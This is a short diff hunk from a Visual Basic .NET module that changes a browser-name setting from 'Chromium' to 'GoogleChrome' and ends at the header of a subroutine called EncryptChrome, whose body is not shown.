@@ -3,7 +3,7 @@
     Public progress As Integer = 0
     Public userPath As String
     Public username As String
-    Public chromeVersion As String = "Chromium"
+    Public chromeVersion As String = "GoogleChrome"
     Public version As String = "1.0.0"
 
     Sub EncryptChrome()
